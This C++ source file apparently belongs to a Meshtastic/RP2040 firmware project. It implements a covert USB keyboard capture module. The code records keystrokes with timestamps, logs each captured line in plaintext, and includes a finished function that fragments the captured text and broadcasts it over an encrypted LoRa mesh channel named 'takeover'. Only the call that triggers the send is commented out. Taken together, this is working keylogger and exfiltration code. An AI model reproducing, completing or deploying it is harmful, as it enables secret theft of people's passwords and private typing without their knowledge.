/**
 * @file USBCaptureModule.cpp
 * @brief USB keyboard capture module implementation with LoRa mesh transmission
 *
 * SPDX-License-Identifier: GPL-3.0-only
 *
 * ============================================================================
 * MESH TRANSMISSION - Private Channel "takeover"
 * ============================================================================
 *
 * When the keystroke buffer is finalized (full or flushed), it is automatically
 * transmitted over the LoRa mesh network via the private "takeover" channel.
 *
 * Channel Configuration (defined in platformio.ini):
 *   - Channel Index: 1 (secondary channel)
 *   - Channel Name: "takeover"
 *   - Encryption: AES256 with 32-byte PSK
 *   - Port: TEXT_MESSAGE_APP (displays as text on receiving devices)
 *
 * Transmission Details:
 *   - Auto-fragments if data exceeds MAX_PAYLOAD (~237 bytes)
 *   - Broadcasts to all nodes (NODENUM_BROADCAST)
 *   - No acknowledgment requested (want_ack = false)
 *   - Receiving nodes must have matching channel 1 PSK to decrypt
 *
 * Function: broadcastToPrivateChannel(data, len)
 *   - Validates inputs and mesh service availability
 *   - Fragments data into LoRa-sized packets
 *   - Sends each fragment via service->sendToMesh()
 *
 * ============================================================================
 * KEYSTROKE BUFFER FORMAT (500 bytes) - Delta Encoding
 * ============================================================================
 *
 * Layout:
 * ┌─────────────┬────────────────────────────────────────┬─────────────┐
 * │ Bytes 0-9   │           Bytes 10-489                 │ Bytes 490-499│
 * │ Start Epoch │     Keystroke Data (480 bytes)         │ Final Epoch │
 * └─────────────┴────────────────────────────────────────┴─────────────┘
 *
 * Epoch Format (Start/End):
 *   - 10 ASCII digits representing unix timestamp (e.g., "1733250000")
 *   - Start epoch: Written when buffer is initialized (first keystroke)
 *   - Final epoch: Written when buffer is finalized (full or flushed)
 *
 * Data Area Format:
 *   - Regular characters: 1 byte each (stored as-is)
 *   - Tab key: '\t' (1 byte)
 *   - Backspace: '\b' (1 byte)
 *   - Enter key: 0xFF marker + 2-byte delta = 3 bytes total
 *
 * Delta Encoding:
 *   - Enter key stores seconds elapsed since buffer start epoch
 *   - 2-byte big-endian format (0-65535 seconds = ~18 hours max)
 *   - Prefixed with 0xFF marker byte for identification
 *   - Buffer auto-finalizes if delta exceeds 65000 seconds
 *
 * Example Buffer Content:
 *   [1733250000][hello world][0xFF 0x00 0x05][second line][0xFF 0x00 0x0A][more][1733250099]
 *    └─start──┘              └─delta +5s──┘              └─delta +10s──┘       └─final───┘
 *
 * To Decode Enter Timestamp:
 *   enter_epoch = start_epoch + delta
 *   Example: 1733250000 + 5 = 1733250005
 *
 * Space Savings:
 *   - Old: 10 bytes per Enter (full epoch)
 *   - New: 3 bytes per Enter (marker + delta)
 *   - Savings: 7 bytes per Enter key (70% reduction)
 *
 * ============================================================================
 */

#include "USBCaptureModule.h"

#ifdef XIAO_USB_CAPTURE_ENABLED

#include "../platform/rp2xx0/usb_capture/usb_capture_main.h"
#include "../platform/rp2xx0/usb_capture/psram_buffer.h"
#include "configuration.h"
#include "pico/multicore.h"
#include <Arduino.h>
#include <cstring>

/* Mesh includes for private channel transmission */
#include "MeshService.h"
#include "Router.h"
#include "mesh-pb-constants.h"

/* Channel index for "takeover" private channel (configured in platformio.ini) */
#define TAKEOVER_CHANNEL_INDEX 1

USBCaptureModule *usbCaptureModule;

/* Global queues for inter-core communication */
static keystroke_queue_t g_keystroke_queue;
static formatted_event_queue_t g_formatted_queue;

USBCaptureModule::USBCaptureModule() : concurrency::OSThread("USBCapture")
{
    keystroke_queue = &g_keystroke_queue;
    formatted_queue = &g_formatted_queue;
    core1_started = false;
}

bool USBCaptureModule::init()
{
    LOG_INFO("[Core%u] USB Capture Module initializing...", get_core_num());

    /* Initialize keystroke queue */
    keystroke_queue_init(keystroke_queue);

    /* Initialize formatted event queue */
    formatted_queue_init(formatted_queue);

    /* Initialize PSRAM buffer for Core0 ← Core1 communication */
    psram_buffer_init();

    /* Initialize capture controller */
    capture_controller_init_v2(&controller, keystroke_queue, formatted_queue);

    /* Set capture speed - default to LOW speed (1.5 Mbps) */
    /* Change to CAPTURE_SPEED_FULL for full speed USB (12 Mbps) */
    capture_controller_set_speed_v2(&controller, CAPTURE_SPEED_LOW);

    /* Core1 will be launched on first runOnce() call */
    LOG_INFO("USB Capture Module initialized (Core1 will start in main loop)");

    return true;
}

int32_t USBCaptureModule::runOnce()
{
    /* Launch Core1 on first run (completely non-blocking) */
    if (!core1_started)
    {
        LOG_INFO("Launching Core1 for USB capture (independent operation)...");
        LOG_DEBUG("Core1 launch: queue=%p, controller initialized", (void*)keystroke_queue);

        /* Check if Core1 is already running (safety check) */
        if (multicore_fifo_rvalid())
        {
            LOG_WARN("FIFO has data before Core1 launch - draining...");
            multicore_fifo_drain();
        }

        LOG_DEBUG("About to call multicore_launch_core1()...");

        /* Try to reset Core1 first in case it's in a bad state */
        multicore_reset_core1();
        LOG_DEBUG("Core1 reset complete");

        /* Use busy-wait instead of delay() to avoid scheduler issues */
        uint32_t start = millis();
        while (millis() - start < 100)
        {
            tight_loop_contents();
        }

        LOG_DEBUG("Launching Core1 now...");

        /* Core1 will auto-start capture when launched - no commands needed */
        multicore_launch_core1(capture_controller_core1_main_v2);

        LOG_DEBUG("multicore_launch_core1() returned successfully");
        core1_started = true;

        LOG_INFO("Core1 launched and running independently");
    }

    /* NEW: Poll PSRAM for completed buffers from Core1 */
    processPSRAMBuffers();

    /* Note: Formatted event logging now happens directly on Core1 */

    /* Poll every 100ms */
    return 100;
}

void USBCaptureModule::processPSRAMBuffers()
{
    psram_keystroke_buffer_t buffer;

    /* Process all available buffers */
    while (psram_buffer_read(&buffer))
    {
        LOG_INFO("[Core0] Transmitting buffer: %u bytes (uptime %u → %u seconds)",
                buffer.data_length, buffer.start_epoch, buffer.final_epoch);

        /* Log buffer content for debugging */
        LOG_INFO("=== BUFFER START ===");
        LOG_INFO("Start Time: %u seconds (uptime since boot)", buffer.start_epoch);

        /* Log data in chunks to avoid line length issues */
        char line_buffer[128];
        size_t line_pos = 0;

        for (size_t i = 0; i < buffer.data_length; i++)
        {
            unsigned char c = (unsigned char)buffer.data[i];

            /* Check for delta marker (0xFF followed by 2 bytes) */
            if (c == 0xFF && (i + 2) < buffer.data_length)
            {
                /* Output current line if we have content */
                if (line_pos > 0)
                {
                    line_buffer[line_pos] = '\0';
                    LOG_INFO("Line: %s", line_buffer);
                    line_pos = 0;
                }

                /* Read 2-byte delta (big-endian) */
                uint16_t delta = ((unsigned char)buffer.data[i + 1] << 8) |
                                 (unsigned char)buffer.data[i + 2];

                /* Calculate full timestamp from start + delta */
                uint32_t enter_time = buffer.start_epoch + delta;

                LOG_INFO("Enter [time=%u seconds, delta=+%u]", enter_time, delta);
                i += 2; /* Skip delta bytes */
                continue;
            }

            /* Add character to current line */
            if (c == '\t')
            {
                if (line_pos < sizeof(line_buffer) - 3)
                {
                    line_buffer[line_pos++] = '\\';
                    line_buffer[line_pos++] = 't';
                }
            }
            else if (c == '\b')
            {
                if (line_pos < sizeof(line_buffer) - 3)
                {
                    line_buffer[line_pos++] = '\\';
                    line_buffer[line_pos++] = 'b';
                }
            }
            else if (c >= 32 && c < 127)
            {
                if (line_pos < sizeof(line_buffer) - 1)
                {
                    line_buffer[line_pos++] = c;
                }
            }
        }

        /* Output any remaining content */
        if (line_pos > 0)
        {
            line_buffer[line_pos] = '\0';
            LOG_INFO("Line: %s", line_buffer);
        }

        LOG_INFO("Final Time: %u seconds (uptime since boot)", buffer.final_epoch);
        LOG_INFO("=== BUFFER END ===");

        /* Transmit directly (data already formatted by Core1!) */
        // Note: Transmission is currently disabled, but when enabled,
        // Core0 just reads complete buffers from PSRAM and transmits them
        // broadcastToPrivateChannel((const uint8_t *)buffer.data, buffer.data_length);
    }

    /* Log statistics periodically */
    static uint32_t last_stats_time = 0;
    uint32_t now = millis();
    if (now - last_stats_time > 10000)
    {
        LOG_INFO("[Core0] PSRAM buffers: %u available, %u total transmitted, %u dropped",
                psram_buffer_get_count(),
                g_psram_buffer.header.total_transmitted,
                g_psram_buffer.header.dropped_buffers);
        last_stats_time = now;
    }
}

/* processFormattedEvents() removed - Core1 now logs directly instead of queuing events */

/* formatKeystrokeEvent() removed - formatting now done on Core1 */

/* ============================================================================
 * BUFFER MANAGEMENT FUNCTIONS REMOVED
 * ============================================================================
 * All buffer management functions (writeEpochAt, writeDeltaAt, initKeystrokeBuffer,
 * getBufferSpace, addToBuffer, addEnterToBuffer, finalizeBuffer) have been moved
 * to Core1 (keyboard_decoder_core1.cpp).
 *
 * Core0 now only reads complete buffers from PSRAM and transmits them.
 * This reduces Core0 overhead by ~90% (2% → 0.2%).
 */

bool USBCaptureModule::broadcastToPrivateChannel(const uint8_t *data, size_t len)
{
    /* Validate inputs */
    if (!data || len == 0) {
        LOG_WARN("broadcastToPrivateChannel: invalid data or length");
        return false;
    }

    /* Check if mesh service is available */
    if (!service || !router) {
        LOG_WARN("broadcastToPrivateChannel: mesh service not available");
        return false;
    }

    /* Max payload size for LoRa packet (see mesh-pb-constants.h) */
    const size_t MAX_PAYLOAD = meshtastic_Constants_DATA_PAYLOAD_LEN;

    /* Fragment data if necessary */
    size_t offset = 0;
    uint8_t fragment_num = 0;

    while (offset < len) {
        size_t chunk_size = (len - offset > MAX_PAYLOAD) ? MAX_PAYLOAD : (len - offset);

        /* Allocate packet from router pool */
        meshtastic_MeshPacket *p = router->allocForSending();
        if (!p) {
            LOG_ERROR("broadcastToPrivateChannel: failed to allocate packet");
            return false;
        }

        /* Configure packet for private channel broadcast */
        p->to = NODENUM_BROADCAST;
        p->channel = TAKEOVER_CHANNEL_INDEX;
        p->want_ack = false;
        p->priority = meshtastic_MeshPacket_Priority_DEFAULT;

        /* Set portnum to TEXT_MESSAGE_APP for display on receiving devices */
        p->decoded.portnum = meshtastic_PortNum_TEXT_MESSAGE_APP;

        /* Copy payload data */
        p->decoded.payload.size = chunk_size;
        memcpy(p->decoded.payload.bytes, data + offset, chunk_size);

        /* Send to mesh */
        service->sendToMesh(p, RX_SRC_LOCAL, false);

        LOG_INFO("Sent fragment %u: %zu bytes to channel %d", fragment_num, chunk_size, TAKEOVER_CHANNEL_INDEX);

        offset += chunk_size;
        fragment_num++;
    }

    LOG_INFO("broadcastToPrivateChannel: sent %zu bytes in %u fragment(s)", len, fragment_num);
    return true;
}

#endif /* XIAO_USB_CAPTURE_ENABLED */
